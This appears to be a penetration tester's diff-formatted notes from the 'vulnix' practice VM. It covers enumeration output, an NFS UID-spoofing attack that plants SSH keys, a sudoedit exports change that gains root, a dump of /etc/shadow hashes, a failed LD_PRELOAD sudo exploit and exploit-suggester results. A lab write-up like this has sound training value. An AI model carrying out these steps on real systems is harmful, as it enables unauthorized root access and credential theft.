+-rwxr-sr-x 1 root shadow 30364 Feb  9  2012 /sbin/unix_chkpwd
+-rwsr-sr-x 1 libuuid libuuid 17976 Mar 30  2012 /usr/sbin/uuidd
+-r-xr-sr-x 1 root postdrop 13624 Jul 30  2012 /usr/sbin/postdrop
+-r-xr-sr-x 1 root postdrop 13608 Jul 30  2012 /usr/sbin/postqueue
+-rwxr-sr-x 1 root ssh 128416 Apr  2  2012 /usr/bin/ssh-agent
+-rwxr-sr-x 1 root shadow 18120 Apr  9  2012 /usr/bin/expiry
+-rwxr-sr-x 3 root mail 9684 Oct 18  2011 /usr/bin/mail-touchlock
+-rwxr-sr-x 3 root mail 9684 Oct 18  2011 /usr/bin/mail-unlock
+-rwxr-sr-x 1 root mail 13708 Aug  4  2010 /usr/bin/lockfile
+-rwxr-sr-x 1 root mail 9720 Jan 10  2012 /usr/bin/mutt_dotlock
+-rwsr-sr-x 1 daemon daemon 42800 Oct 25  2011 /usr/bin/at
+-rwxr-sr-x 1 root mail 13932 Oct 17  2011 /usr/bin/dotlockfile
+-rwxr-sr-x 1 root tty 18036 Mar 30  2012 /usr/bin/wall
+-rwxr-sr-x 1 root shadow 45284 Apr  9  2012 /usr/bin/chage
+-rwxr-sr-x 1 root tty 9728 Mar 31  2012 /usr/bin/bsd-write
+-rwxr-sr-x 3 root mail 9684 Oct 18  2011 /usr/bin/mail-lock
+-rwxr-sr-x 1 root crontab 34776 Jun 19  2012 /usr/bin/crontab
+-rwxr-sr-x 1 root utmp 365260 Jun  6  2011 /usr/bin/screen
+-rwxr-sr-x 1 root mlocate 34432 Aug 17  2011 /usr/bin/mlocate
+-rwsr-sr-x 1 root mail 75600 Aug  4  2010 /usr/bin/procmail
+
+
+[+] Possibly interesting GUID files:
+-rwxr-sr-x 1 root ssh 128416 Apr  2  2012 /usr/bin/ssh-agent
+
+
+[+] rhost config file(s) and file contents:
+-rw------- 1 user user 7 Sep  2  2012 /home/user/.rhosts
++ user
+
+
+[+] Hosts.equiv file and contents: 
+-rw-r--r-- 1 root root 117 Jun 26  2010 /etc/hosts.equiv
+# /etc/hosts.equiv: list  of  hosts  and  users  that are granted "trusted" r
+#		    command access to your system .
+
+
+[-] NFS config details: 
+-rw-r--r-- 1 root root 420 Sep  2  2012 /etc/exports
+# /etc/exports: the access control list for filesystems which may be exported
+#		to NFS clients.  See exports(5).
+#
+# Example for NFSv2 and NFSv3:
+# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
+#
+# Example for NFSv4:
+# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
+# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
+#
+/home/vulnix	*(rw,root_squash)
+
+
+[-] NFS displaying partitions and filesystems - you need to check if exotic filesystems
+# /etc/fstab: static file system information.
+#
+# Use 'blkid' to print the universally unique identifier for a
+# device; this may be used with UUID= as a more robust way to name devices
+# that works even if disks are added and removed. See fstab(5).
+#
+# <file system> <mount point>   <type>  <options>       <dump>  <pass>
+proc            /proc           proc    nodev,noexec,nosuid 0       0
+/dev/mapper/vulnix-root /               ext4    errors=remount-ro 0       1
+# /boot was on /dev/sda1 during installation
+UUID=14f8e0aa-04a1-4976-a52b-73ab33ba1f1f /boot           ext2    defaults        0       2
+/dev/mapper/vulnix-swap_1 none            swap    sw              0       0
+/dev/fd0        /media/floppy0  auto    rw,user,noauto,exec,utf8 0       0
+
+
+[-] Can't search *.conf files as no keyword was entered
+
+[-] Can't search *.php files as no keyword was entered
+
+[-] Can't search *.log files as no keyword was entered
+
+[-] Can't search *.ini files as no keyword was entered
+
+[-] All *.conf files in /etc (recursive 1 level):
+-rw-r----- 1 root fuse 216 Oct 18  2011 /etc/fuse.conf
+-rw-r--r-- 1 root root 834 Dec 16  2011 /etc/gssapi_mech.conf
+-rw-r--r-- 1 root root 144 Sep  2  2012 /etc/kernel-img.conf
+-rw-r--r-- 1 root root 839 Apr 10  2012 /etc/insserv.conf
+-rw-r--r-- 1 root root 326 Aug 17  2011 /etc/updatedb.conf
+-rw-r--r-- 1 root root 956 Mar 30  2012 /etc/mke2fs.conf
+-rw-r--r-- 1 root root 552 Feb  9  2012 /etc/pam.conf
+-rw-r--r-- 1 root root 350 Sep  2  2012 /etc/popularity-contest.conf
+-rw-r--r-- 1 root root 2083 Dec  5  2011 /etc/sysctl.conf
+-rw-r--r-- 1 root root 15752 Jul 25  2009 /etc/ltrace.conf
+-rw-r--r-- 1 root root 1318 Sep  2  2012 /etc/inetd.conf
+-rw-r--r-- 1 root root 2969 Mar 15  2012 /etc/debconf.conf
+-rw-r--r-- 1 root root 34 Sep  2  2012 /etc/ld.so.conf
+-rw-r--r-- 1 root root 206 Mar 27  2012 /etc/idmapd.conf
+-rw-r--r-- 1 root root 4728 May  2  2012 /etc/hdparm.conf
+-rw-r--r-- 1 root root 3343 Apr 20  2012 /etc/gai.conf
+-rw-r--r-- 1 root root 599 Oct  4  2011 /etc/logrotate.conf
+-rw-r--r-- 1 root root 1260 May  2  2011 /etc/ucf.conf
+-rw-r--r-- 1 root root 6961 Sep  2  2012 /etc/ca-certificates.conf
+-rw-r--r-- 1 root root 92 Apr 19  2012 /etc/host.conf
+-rw-r--r-- 1 root root 1263 Mar 30  2012 /etc/rsyslog.conf
+-rw-r--r-- 1 root root 475 Apr 19  2012 /etc/nsswitch.conf
+-rw-r--r-- 1 root root 321 Mar 30  2012 /etc/blkid.conf
+-rw-r--r-- 1 root root 604 Oct 19  2011 /etc/deluser.conf
+-rw-r--r-- 1 root root 2981 Sep  2  2012 /etc/adduser.conf
+
+
+[-] Current user's history files:
+-rw------- 1 user user 28 Mar  2 23:43 /home/user/.bash_history
+
+
+[-] Location and contents (if accessible) of .bash_history file(s):
+/home/user/.bash_history
+id
+ls -al
+cat .rhosts 
+exit
+
+
+[-] Any interesting mail in /var/mail:
+total 12
+drwxrwsr-x  2 root   mail 4096 Mar  3 00:15 .
+drwxr-xr-x 12 root   root 4096 Sep  2  2012 ..
+-rw-rw----  1 nobody mail 1090 Mar  3 00:15 nobody
+
+
+### SCAN COMPLETE ####################################
+user@vulnix:~$ 
+
+================================================================================================================================================================
+
+The UID of the vulnix account is '2008' !!!
+---------------------------------------------
+
+root@Security-Audit-01:/home/pentester# mount -t nfs 192.168.1.37:/home/vulnix /mnt/temp/ -o nolock
+
+root@Security-Audit-01:/home/pentester# adduser user
+
+root@Security-Audit-01:/mnt# gedit /etc/passwd			//I replaced manually the UID and GID of the account 'user' with 2008
+
+
+root@Security-Audit-01:/mnt# su user
+
+user@Security-Audit-01:/root/Desktop/Linux-privesc$ id
+uid=2008(user) gid=2008 groups=2008
+
+user@Security-Audit-01:/root/Desktop/Linux-privesc$ cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+<SNIP>
+user:x:2008:2008:test,test,test,:/home/user:/bin/bash
+
+user@Security-Audit-01:/root/Desktop/Linux-privesc$ ls -al /mnt/temp/home/vulnix/
+total 20
+drwxr-x--- 2 nobody vulnix 4096 Sep  2  2012 .
+drwxr-xr-x 4 root   root   4096 Sep  2  2012 ..
+-rw-r--r-- 1 nobody vulnix  220 Apr  3  2012 .bash_logout
+-rw-r--r-- 1 nobody vulnix 3486 Apr  3  2012 .bashrc
+-rw-r--r-- 1 nobody vulnix  675 Apr  3  2012 .profile
+
+
+user@Security-Audit-01:/root/Desktop/Linux-privesc$ echo + + > /mnt/temp/home/vulnix/.rhosts
+
+user@Security-Audit-01:/root/Desktop/Linux-privesc$ ls -al /mnt/temp/home/vulnix/
+total 24
+drwxr-x--- 2 nobody vulnix 4096 Mar  3 01:43 .
+drwxr-xr-x 4 root   root   4096 Sep  2  2012 ..
+-rw-r--r-- 1 nobody vulnix  220 Apr  3  2012 .bash_logout
+-rw-r--r-- 1 nobody vulnix 3486 Apr  3  2012 .bashrc
+-rw-r--r-- 1 nobody vulnix  675 Apr  3  2012 .profile
+-rw-r--r-- 1 nobody vulnix    4 Mar  3 01:43 .rhosts
+
+user@Security-Audit-01:/root/Desktop/Linux-privesc$ cat /mnt/temp/home/vulnix/.rhosts
++ +
+
+user@Security-Audit-01:/root/Desktop/Linux-privesc$ rlogin -l vulnix 192.168.1.37 
+load pubkey "/home/user/.ssh/id_rsa": Permission denied
+load pubkey "/home/user/.ssh/id_rsa": Permission denied
+load pubkey "/home/user/.ssh/id_dsa": Permission denied
+load pubkey "/home/user/.ssh/id_dsa": Permission denied
+load pubkey "/home/user/.ssh/id_ecdsa": Permission denied
+load pubkey "/home/user/.ssh/id_ecdsa": Permission denied
+load pubkey "/home/user/.ssh/id_ed25519": Permission denied
+load pubkey "/home/user/.ssh/id_ed25519": Permission denied
+load pubkey "/home/user/.ssh/id_xmss": Permission denied
+load pubkey "/home/user/.ssh/id_xmss": Permission denied
+The authenticity of host '192.168.1.37 (192.168.1.37)' can't be established.
+ECDSA key fingerprint is SHA256:IGOuLMZRTuUvY58a8TN+ef/1zyRCAHk0qYP4wMViOAg.
+Are you sure you want to continue connecting (yes/no)? yes
+Failed to add the host to the list of known hosts (/home/user/.ssh/known_hosts).
+vulnix@192.168.1.37's password: 
+Permission denied, please try again.
+vulnix@192.168.1.37's password: 
+Permission denied, please try again.
+vulnix@192.168.1.37's password: 
+vulnix@192.168.1.37: Permission denied (publickey,password).
+
+
+It does not work... so I will add a SSH key instead...
+
+
+user@Security-Audit-01:/root/.ssh$ cd /mnt/temp/home/vulnix
+
+user@Security-Audit-01:/mnt/temp/home/vulnix$ ls -al
+total 24
+drwxr-x--- 2 nobody vulnix 4096 Mar  3 01:43 .
+drwxr-xr-x 4 root   root   4096 Sep  2  2012 ..
+-rw-r--r-- 1 nobody vulnix  220 Apr  3  2012 .bash_logout
+-rw-r--r-- 1 nobody vulnix 3486 Apr  3  2012 .bashrc
+-rw-r--r-- 1 nobody vulnix  675 Apr  3  2012 .profile
+-rw-r--r-- 1 nobody vulnix    4 Mar  3 01:43 .rhosts
+
+user@Security-Audit-01:/mnt/temp/home/vulnix$ mkdir .ssh
+
+user@Security-Audit-01:/mnt/temp/home/vulnix$ echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuL/0JuMt9khIUctnPxoVDpgBZfRwEjViQiopb+n3AuQXqfUEmWpDpWGhnaCBxtrK/b+gvspRbvmB4c4Olbafiz75umPfn3Hsi//fbp8Dz6RGEpChaBZMdf7V0SJb+UL4M1WwvU6oWvBeTsKgjdGrdxe2InyWi+hfB8JB2i3E9D5p+M/3La837IhppWg0g6P/u4XyhJ2+oczKWxCwHwYaHdkSvHS9At2vq4UEpTHRStVkWkGKdmY2+73CE/jlBoJSAWUkM3P7V0YYr6Ri6Z8hJHh67Q0vxkeBaMOUx+vHTFyCv9K/dt1RpO82TNnl79VD0jMGVWzoM39I2c1pbITd9 root@Security-Audit-01 > authorized_keys
+
+user@Security-Audit-01:/mnt/temp/home/vulnix$ ls -al
+total 32
+drwxr-x--- 3 nobody vulnix 4096 Mar  3 01:54 .
+drwxr-xr-x 4 root   root   4096 Sep  2  2012 ..
+-rw-r--r-- 1 nobody vulnix  404 Mar  3 01:54 authorized_keys
+-rw-r--r-- 1 nobody vulnix  220 Apr  3  2012 .bash_logout
+-rw-r--r-- 1 nobody vulnix 3486 Apr  3  2012 .bashrc
+-rw-r--r-- 1 nobody vulnix  675 Apr  3  2012 .profile
+-rw-r--r-- 1 nobody vulnix    4 Mar  3 01:43 .rhosts
+drwxr-xr-x 2 nobody vulnix 4096 Mar  3 01:54 .ssh
+
+user@Security-Audit-01:/mnt/temp/home/vulnix$ cp authorized_keys .ssh/
+
+user@Security-Audit-01:/mnt/temp/home/vulnix$ ls -al .ssh/
+total 12
+drwxr-xr-x 2 nobody vulnix 4096 Mar  3 01:55 .
+drwxr-x--- 3 nobody vulnix 4096 Mar  3 01:54 ..
+-rw-r--r-- 1 nobody vulnix  404 Mar  3 01:55 authorized_keys
+
+
+user@Security-Audit-01:/mnt/temp/home/vulnix$ cat .ssh/authorized_keys 
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuL/0JuMt9khIUctnPxoVDpgBZfRwEjViQiopb+n3AuQXqfUEmWpDpWGhnaCBxtrK/b+gvspRbvmB4c4Olbafiz75umPfn3Hsi//fbp8Dz6RGEpChaBZMdf7V0SJb+UL4M1WwvU6oWvBeTsKgjdGrdxe2InyWi+hfB8JB2i3E9D5p+M/3La837IhppWg0g6P/u4XyhJ2+oczKWxCwHwYaHdkSvHS9At2vq4UEpTHRStVkWkGKdmY2+73CE/jlBoJSAWUkM3P7V0YYr6Ri6Z8hJHh67Q0vxkeBaMOUx+vHTFyCv9K/dt1RpO82TNnl79VD0jMGVWzoM39I2c1pbITd9 root@Security-Audit-01
+
+user@Security-Audit-01:/mnt/temp/home/vulnix$ su root
+
+root@Security-Audit-01:/mnt/temp/home/vulnix# cd /root
+
+root@Security-Audit-01:~# ssh -i id_rsa vulnix@192.168.1.37
+
+Warning: Identity file id_rsa not accessible: No such file or directory.
+Welcome to Ubuntu 12.04.1 LTS (GNU/Linux 3.2.0-29-generic-pae i686)
+
+ * Documentation:  https://help.ubuntu.com/
+
+  System information as of Tue Mar  3 00:59:01 GMT 2019
+
+  System load:  0.0              Processes:           91
+  Usage of /:   91.6% of 773MB   Users logged in:     1
+  Memory usage: 7%               IP address for eth0: 192.168.1.37
+  Swap usage:   0%
+
+  => / is using 91.6% of 773MB
+
+  Graph this data and manage this system at https://landscape.canonical.com/
+
+New release '14.04.6 LTS' available.
+Run 'do-release-upgrade' to upgrade to it.
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+vulnix@vulnix:~$ id
+uid=2008(vulnix) gid=2008(vulnix) groups=2008(vulnix)
+
+vulnix@vulnix:~$ 
+
+vulnix@vulnix:~$ sudo -l
+Matching 'Defaults' entries for vulnix on this host:
+    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User vulnix may run the following commands on this host:
+    (root) sudoedit /etc/exports, (root) NOPASSWD: sudoedit /etc/exports
+
+vulnix@vulnix:~$ 
+
+
+================================================================================================================================================================
+Step 3. Privesc from 'vulnix' account to root
+================================================================================================================================================================
+
+vulnix@vulnix:~$ sudo -l
+Matching 'Defaults' entries for vulnix on this host:
+    env_reset, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User vulnix may run the following commands on this host:
+    (root) sudoedit /etc/exports, (root) NOPASSWD: sudoedit /etc/exports
+
+vulnix@vulnix:~$ sudoedit /etc/exports
+
+# /etc/exports: the access control list for filesystems which may be exported
+#               to NFS clients.  See exports(5).
+#
+# Example for NFSv2 and NFSv3:
+# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
+#
+# Example for NFSv4:
+# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
+# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
+#
+/home/vulnix    *(rw,root_squash)
+/root           *(rw,rw,no_root_squash)
+
+
+The new file is saved under "/var/tmp/exports.XXZoolqw"
+
+********************  AFTER REBOOTING the VM  ********************
+
+root@Security-Audit-01:~# ssh -i id_rsa vulnix@192.168.1.37
+Warning: Identity file id_rsa not accessible: No such file or directory.
+Welcome to Ubuntu 12.04.1 LTS (GNU/Linux 3.2.0-29-generic-pae i686)
+
+ * Documentation:  https://help.ubuntu.com/
+
+  System information as of Tue Mar  3 02:08:39 GMT 2019
+
+  System load:  0.0              Processes:           95
+  Usage of /:   91.6% of 773MB   Users logged in:     0
+  Memory usage: 3%               IP address for eth0: 192.168.1.37
+  Swap usage:   0%
+
+  => / is using 91.6% of 773MB
+
+  Graph this data and manage this system at https://landscape.canonical.com/
+
+New release '14.04.6 LTS' available.
+Run 'do-release-upgrade' to upgrade to it.
+
+Last login: Tue Mar  3 00:59:01 2019 from 192.168.1.8
+
+vulnix@vulnix:~$ cat /etc/exports
+# /etc/exports: the access control list for filesystems which may be exported
+#		to NFS clients.  See exports(5).
+#
+# Example for NFSv2 and NFSv3:
+# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
+#
+# Example for NFSv4:
+# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
+# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
+#
+/home/vulnix	*(rw,no_root_squash)
+/root           *(rw,rw,no_root_squash)
+
+vulnix@vulnix:~$ 
+
+
+
+
+root@Security-Audit-01:~/Desktop/CTFs/HackLab# showmount -e 192.168.1.37
+Export list for 192.168.1.37:
+/root        *
+/home/vulnix *
+
+root@Security-Audit-01:~/Desktop/CTFs/HackLab# mkdir /mnt/temp2
+
+root@Security-Audit-01:~/Desktop/CTFs/HackLab# mount -t nfs 192.168.1.37:/root /mnt/temp2/ -o nolock
+
+root@Security-Audit-01:~/Desktop/CTFs/HackLab# ls -al /mnt/temp2/root
+ls: cannot access '/mnt/temp2/root': No such file or directory
+
+root@Security-Audit-01:~/Desktop/CTFs/HackLab# ls -al /mnt/temp2/
+total 28
+drwx------ 3 root root 4096 Sep  2  2012 .
+drwxr-xr-x 5 root root 4096 Mar  3 03:33 ..
+-rw------- 1 root root    0 Sep  2  2012 .bash_history
+-rw-r--r-- 1 root root 3106 Apr 19  2012 .bashrc
+drwx------ 2 root root 4096 Sep  2  2012 .cache
+-rw-r--r-- 1 root root  140 Apr 19  2012 .profile
+-r-------- 1 root root   33 Sep  2  2012 trophy.txt
+-rw------- 1 root root  710 Sep  2  2012 .viminfo
+
+root@Security-Audit-01:~/Desktop/CTFs/HackLab# cat /mnt/temp2/trophy.txt 
+cc614640424f5bd60ce5d5264899c3be
+
+root@Security-Audit-01:~/Desktop/CTFs/HackLab# 
+
+root@Security-Audit-01:~/Desktop/CTFs/HackLab# cd /mnt/temp2/ 
+
+root@Security-Audit-01:/mnt/temp2# ls -al
+total 28
+drwx------ 3 root root 4096 Sep  2  2012 .
+drwxr-xr-x 5 root root 4096 Mar  3 03:33 ..
+-rw------- 1 root root    0 Sep  2  2012 .bash_history
+-rw-r--r-- 1 root root 3106 Apr 19  2012 .bashrc
+drwx------ 2 root root 4096 Sep  2  2012 .cache
+-rw-r--r-- 1 root root  140 Apr 19  2012 .profile
+-r-------- 1 root root   33 Sep  2  2012 trophy.txt
+-rw------- 1 root root  710 Sep  2  2012 .viminfo
+
+root@Security-Audit-01:/mnt/temp2# mkdir .ssh
+
+root@Security-Audit-01:/mnt/temp2# echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCuL/0JuMt9khIUctnPxoVDpgBZfRwEjViQiopb+n3AuQXqfUEmWpDpWGhnaCBxtrK/b+gvspRbvmB4c4Olbafiz75umPfn3Hsi//fbp8Dz6RGEpChaBZMdf7V0SJb+UL4M1WwvU6oWvBeTsKgjdGrdxe2InyWi+hfB8JB2i3E9D5p+M/3La837IhppWg0g6P/u4XyhJ2+oczKWxCwHwYaHdkSvHS9At2vq4UEpTHRStVkWkGKdmY2+73CE/jlBoJSAWUkM3P7V0YYr6Ri6Z8hJHh67Q0vxkeBaMOUx+vHTFyCv9K/dt1RpO82TNnl79VD0jMGVWzoM39I2c1pbITd9 root@Security-Audit-01 > .ssh/authorized_keys
+
+root@Security-Audit-01:/mnt/temp2# 
+
+
+root@Security-Audit-01:/mnt/temp2# ssh root@192.168.1.37
+Welcome to Ubuntu 12.04.1 LTS (GNU/Linux 3.2.0-29-generic-pae i686)
+
+ * Documentation:  https://help.ubuntu.com/
+
+  System information as of Tue Mar  3 02:38:59 GMT 2019
+
+  System load:  0.0              Processes:           91
+  Usage of /:   91.6% of 773MB   Users logged in:     1
+  Memory usage: 4%               IP address for eth0: 192.168.1.37
+  Swap usage:   0%
+
+  => / is using 91.6% of 773MB
+
+  Graph this data and manage this system at https://landscape.canonical.com/
+
+New release '14.04.6 LTS' available.
+Run 'do-release-upgrade' to upgrade to it.
+
+root@vulnix:~# id
+uid=0(root) gid=0(root) groups=0(root)
+
+root@vulnix:~# cat /etc/shadow
+root:$6$GpmQGQUN$8kLewzMF4ItmxezcryWqSPrXNRTH5TOQFKKkHjK2NSmrTg95xiYi.l8L.RYUL.8pAsj8s4EGvDy4dvENQIqNf.:15585:0:99999:7:::
+daemon:*:15585:0:99999:7:::
+bin:*:15585:0:99999:7:::
+sys:*:15585:0:99999:7:::
+sync:*:15585:0:99999:7:::
+games:*:15585:0:99999:7:::
+man:*:15585:0:99999:7:::
+lp:*:15585:0:99999:7:::
+mail:*:15585:0:99999:7:::
+news:*:15585:0:99999:7:::
+uucp:*:15585:0:99999:7:::
+proxy:*:15585:0:99999:7:::
+www-data:*:15585:0:99999:7:::
+backup:*:15585:0:99999:7:::
+list:*:15585:0:99999:7:::
+irc:*:15585:0:99999:7:::
+gnats:*:15585:0:99999:7:::
+nobody:*:15585:0:99999:7:::
+libuuid:!:15585:0:99999:7:::
+syslog:*:15585:0:99999:7:::
+messagebus:*:15585:0:99999:7:::
+whoopsie:*:15585:0:99999:7:::
+postfix:*:15585:0:99999:7:::
+dovecot:*:15585:0:99999:7:::
+dovenull:*:15585:0:99999:7:::
+landscape:*:15585:0:99999:7:::
+sshd:*:15585:0:99999:7:::
+user:$6$gLVDPSY5$CGHDuEBpkC90vX2xFD9NeJC0O9XfhVj9oFVvL8XbTRpBnt/7WJFpADj0zboPTKTqPbOHafZGUd/exj4OZ1Frc/:15585:0:99999:7:::
+vulnix:$6$tMOyhDF2$gExhASDVWJqHYn00.A8XLJb.DvE7bdD6NffAno3iY5zEkJwZ4yDTGMrhdVbkMXV1dlBT00DoGFR7oXbtDi3lQ0:15585:0:99999:7:::
+statd:*:15585:0:99999:7:::
+
+root@vulnix:~# cat /etc/sudoers
+#
+# This file MUST be edited with the 'visudo' command as root.
+#
+# Please consider adding local content in /etc/sudoers.d/ instead of
+# directly modifying this file.
+#
+# See the man page for details on how to write a sudoers file.
+#
+Defaults	env_reset
+Defaults	secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
+
+# Host alias specification
+
+# User alias specification
+
+# Cmnd alias specification
+Cmnd_Alias EXPORTS = sudoedit /etc/exports
+
+# User privilege specification
+root	ALL=(ALL:ALL) ALL
+vulnix ALL=EXPORTS, NOPASSWD: EXPORTS
+
+# Members of the admin group may gain root privileges
+%admin ALL=(ALL) ALL
+
+# Allow members of group sudo to execute any command
+%sudo	ALL=(ALL:ALL) ALL
+
+# See sudoers(5) for more information on "#include" directives:
+
+#includedir /etc/sudoers.d
+
+
+================================================================================================================================================================
+Other tests...
+================================================================================================================================================================
+Privesc with "Sudo version 1.8.3p1" - https://www.exploit-db.com/exploits/25134
+Privesc with "Sudo version < 1.8.5" 
+
+
+root@Security-Audit-01:~/Desktop/CTFs/HackLab# gcc -o privesc-sudo.o -c privesc-sudo.c -fPIC
+
+root@Security-Audit-01:~/Desktop/CTFs/HackLab# gcc -shared -Wl,-soname,libxoxo.so.1 -o /tmp/libxoxo.so.1.0 privesc-sudo.o -nostartfiles
+
+root@Security-Audit-01:~/Desktop/CTFs/HackLab# ls -al
+total 32
+drwxr-xr-x  2 root      root      4096 Mar  3 02:20 .
+drwxr-xr-x 18 root      root      4096 Mar  2 22:03 ..
+-rw-r--r--  1 root      root        15 Mar  2 23:22 pass.txt
+-rw-r--r--  1 pentester pentester  330 Mar  3 02:18 privesc-sudo.c
+-rw-r--r--  1 root      root      2120 Mar  3 02:20 privesc-sudo.o
+-rw-r--r--  1 root      root         7 Mar  2 23:07 users.lst
+-rw-r--r--  1 root      root         7 Mar  3 01:03 users.txt
+-rw-r--r--  1 root      root        10 Mar  2 23:22 user.txt
+
+root@Security-Audit-01:~/Desktop/CTFs/HackLab# cp /tmp/libxoxo.so.1.0 ./
+
+root@Security-Audit-01:~/Desktop/CTFs/HackLab# ls -al
+total 48
+drwxr-xr-x  2 root      root       4096 Mar  3 02:21 .
+drwxr-xr-x 18 root      root       4096 Mar  2 22:03 ..
+-rwxr-xr-x  1 root      root      14656 Mar  3 02:21 libxoxo.so.1.0
+-rw-r--r--  1 root      root         15 Mar  2 23:22 pass.txt
+-rw-r--r--  1 pentester pentester   330 Mar  3 02:18 privesc-sudo.c
+-rw-r--r--  1 root      root       2120 Mar  3 02:20 privesc-sudo.o
+-rw-r--r--  1 root      root          7 Mar  2 23:07 users.lst
+-rw-r--r--  1 root      root          7 Mar  3 01:03 users.txt
+-rw-r--r--  1 root      root         10 Mar  2 23:22 user.txt
+
+root@Security-Audit-01:~/Desktop/CTFs/HackLab# chmod 777 /tmp/libxoxo.so.1.0 
+
+root@Security-Audit-01:~/Desktop/CTFs/HackLab# su user
+
+user@Security-Audit-01:/root/Desktop/CTFs/HackLab$ cp /tmp/libxoxo.so.1.0 /mnt/temp/home/vulnix/
+user@Security-Audit-01:/root/Desktop/CTFs/HackLab$ 
+
+vulnix@vulnix:~$ sudo LD_PRELOAD=/tmp/libxoxo.so.1.0 sudoedit /etc/exports
+[sudo] password for vulnix: 
+Sorry, try again.
+
+After being root.... I changed the password to test my attack...
+
+root@vulnix:~# passwd vulnix
+Enter new UNIX password: 
+Retype new UNIX password: 
+passwd: password updated successfully
+
+root@vulnix:~# sudo LD_PRELOAD=/tmp/libxoxo.so.1.0 sudoedit /etc/exports
+=> It did not worked
+
+================================================================================================================================================================
+
+vulnix@vulnix:~$ ./Linux-exploit-suggester.sh 
+
+Available information:
+
+Kernel version: 3.2.0
+Architecture: i386
+Distribution: ubuntu
+Distribution version: 12.04.1
+Additional checks (CONFIG_*, sysctl entries, custom Bash commands): performed
+Package listing: from current OS
+
+Searching among:
+
+70 kernel space exploits
+32 user space exploits
+
+Possible Exploits:
+
+[+] [CVE-2013-2094] perf_swevent
+
+   Details: http://timetobleed.com/a-closer-look-at-a-recent-privilege-escalation-bug-in-linux-cve-2013-2094/
+   Tags: RHEL=6,[ ubuntu=12.04 ]
+   Download URL: https://www.exploit-db.com/download/26131
+
+[+] [CVE-2013-0268] msr
+
+   Details: https://www.exploit-db.com/exploits/27297/
+   Download URL: https://www.exploit-db.com/download/27297
+
+[+] [CVE-2013-1959] userns_root_sploit
+
+   Details: http://www.openwall.com/lists/oss-security/2013/04/29/1
+   Download URL: https://www.exploit-db.com/download/25450
+
+[+] [CVE-2013-2094] semtex
+
+   Details: http://timetobleed.com/a-closer-look-at-a-recent-privilege-escalation-bug-in-linux-cve-2013-2094/
+   Tags: RHEL=6
+   Download URL: https://www.exploit-db.com/download/25444
+
+[+] [CVE-2014-0196] rawmodePTY
+
+   Details: http://blog.includesecurity.com/2014/06/exploit-walkthrough-cve-2014-0196-pty-kernel-race-condition.html
+   Download URL: https://www.exploit-db.com/download/33516
+
+[+] [CVE-2014-4014] inode_capable
+
+   Details: http://www.openwall.com/lists/oss-security/2014/06/10/4
+   Tags: [ ubuntu=12.04 ]
+   Download URL: https://www.exploit-db.com/download/33824
+
+[+] [CVE-2014-4699] ptrace/sysret
+
+   Details: http://www.openwall.com/lists/oss-security/2014/07/08/16
+   Tags: [ ubuntu=12.04 ]
+   Download URL: https://www.exploit-db.com/download/34134
+
+[+] [CVE-2014-5207] fuse_suid
+
+   Details: https://www.exploit-db.com/exploits/34923/
+   Download URL: https://www.exploit-db.com/download/34923
+
+[+] [CVE-2015-8660] overlayfs (ovl_setattr)
+
+   Details: http://www.halfdog.net/Security/2015/UserNamespaceOverlayfsSetuidWriteExec/
+   Download URL: https://www.exploit-db.com/download/39230
+
+[+] [CVE-2015-8660] overlayfs (ovl_setattr)
+
+   Details: http://www.halfdog.net/Security/2015/UserNamespaceOverlayfsSetuidWriteExec/
+   Tags: ubuntu=14.04|15.10
+   Download URL: https://www.exploit-db.com/download/39166
+
+[+] [CVE-2016-2384] usb-midi
+
+   Details: https://xairy.github.io/blog/2016/cve-2016-2384
+   Tags: ubuntu=14.04,fedora=22
+   Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-2384/poc.c
+   Comments: Requires ability to plug in a malicious USB device and to execute a malicious binary as a non-privileged user
+
+[+] [CVE-2016-5195] dirtycow
+
+   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
+   Tags: debian=7|8,RHEL=5{kernel:2.6.(18|24|33)-*},RHEL=6{kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31},RHEL=7{kernel:3.10.0-*|4.2.0-0.21.el7},[ ubuntu=16.04|14.04|12.04 ]
+   Download URL: https://www.exploit-db.com/download/40611
+   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh
+
+[+] [CVE-2016-5195] dirtycow 2
+
+   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
+   Tags: debian=7|8,RHEL=5|6|7,[ ubuntu=14.04|12.04 ],ubuntu=10.04{kernel:2.6.32-21-generic},ubuntu=16.04{kernel:4.4.0-21-generic}
+   Download URL: https://www.exploit-db.com/download/40839
+   ext-url: https://www.exploit-db.com/download/40847.cpp
+   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh
+
+[+] [CVE-2017-6074] dccp
+
+   Details: http://www.openwall.com/lists/oss-security/2017/02/22/3
+   Tags: ubuntu=(14.04|16.04){kernel:4.4.0-62-generic}
